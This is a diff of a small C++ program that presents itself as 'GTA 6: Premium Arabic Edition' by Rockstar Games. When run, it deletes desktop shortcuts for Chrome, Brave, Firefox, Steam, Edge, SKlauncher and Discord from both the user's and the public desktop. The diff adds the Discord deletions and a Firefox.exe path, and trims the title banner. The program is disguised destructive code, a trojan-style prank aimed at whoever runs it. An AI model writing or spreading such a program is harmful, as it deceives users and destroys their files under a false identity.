@@ -1,4 +1,5 @@
 // ver 1.0.0.3
+// If "Copilot" is listed as a contributor it is due to a bug
 
 #include <iostream>
 #include <fstream>
@@ -20,16 +21,19 @@ int main()
     std::string bravelnk = std::string(userProfile) + "\\Desktop\\Brave.lnk";
     std::string steamlnk = std::string(userProfile) + "\\Desktop\\Steam.lnk";
     std::string firefoxlnk = std::string(userProfile) + "\\Desktop\\Firefox.lnk";
+    std::string firefoxexe = std::string(userProfile) + "\\Desktop\\Firefox.exe";
     std::string sklauncherlnk = std::string(userProfile) + "\\Desktop\\SKlauncher.lnk";
     std::string edgelnk = std::string(userProfile) + "\\Desktop\\Microsoft Edge.lnk";
+    std::string discordlnk = std::string(userProfile) + "\\Desktop\\Discord.lnk";
     // allusers desktop defs
     std::string googlelnkpub = "C:\\Users\\Public\\Desktop\\Google Chrome.lnk";
     std::string steamlnkpub = "C:\\Users\\Public\\Desktop\\Steam.lnk";
     std::string bravelnkpub = "C:\\Users\\Public\\Desktop\\Brave.lnk";
     std::string firefoxlnkpub = "C:\\Users\\Public\\Desktop\\Firefox.lnk";
     std::string sklauncherlnkpub = "C:\\Users\\Public\\Desktop\\SKlauncher.lnk";
+    std::string discordlnkpub = "C:\\Users\\Public\\Desktop\\Discord.lnk";
 
-    std::cout << "GTA 6: Premium Arabic Edition -- Information For Executable\n";
+    std::cout << "Info \n";
     std::cout << "Application Name: GTA 6: Premium Arabic Edition\n";
     std::cout << "Publisher: Rockstar Games\n";
     std::cout << "\n";
@@ -71,6 +75,13 @@ int main()
     else {
         std::cout << "Failed to delete file\n" << std::endl;
     }
+    
+    if (fs::remove(discordlnk)) {
+        std::cout << "File has been successfully deleted\n" << std::endl;
+    }
+    else {
+        std::cout << "Failed to delete file\n" << std::endl;
+    }
     std::cout << "All Users:\n";
     if (fs::remove(steamlnkpub)) {
         std::cout << "File has been successfully deleted\n" << std::endl;
@@ -97,6 +108,12 @@ int main()
         std::cout << "Failed to delete file\n" << std::endl;
     }
     if (fs::remove(sklauncherlnkpub)) {
+        std::cout << "File has been successfully deleted\n" << std::endl;
+    }
+    else {
+        std::cout << "Failed to delete file\n" << std::endl;
+    }
+    if (fs::remove(discordlnkpub)) {
         std::cout << "File has been successfully deleted\n" << std::endl;
     }
     else {
